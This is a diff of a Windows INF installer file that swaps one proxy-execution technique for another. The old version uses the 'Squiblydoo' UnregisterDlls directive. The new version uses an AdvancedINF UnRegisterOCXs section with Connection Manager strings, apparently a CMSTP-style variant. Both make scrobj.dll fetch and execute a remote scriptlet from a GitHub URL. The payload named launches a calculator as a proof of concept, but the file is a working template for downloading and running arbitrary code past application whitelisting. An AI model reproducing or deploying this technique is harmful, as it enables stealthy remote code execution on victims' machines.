@@ -1,8 +1,14 @@
-[Version] 
-Signature=$CHICAGO$
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
 
-[DefaultInstall]
-UnregisterDlls = Squiblydoo
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
 
-[Squiblydoo]
-11,,scrobj.dll,2,60,https://raw.githubusercontent.com/alextspy/Execute-calc/master/calc.sct
+[UnRegisterOCXSection]
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/alextspy/Execute-calc/master/calc.sct
+
+[Strings]
+AppAct = "SOFTWARE\Microsoft\Connection Manager"
+ServiceName="Yay"
+ShortSvcName="Yay"
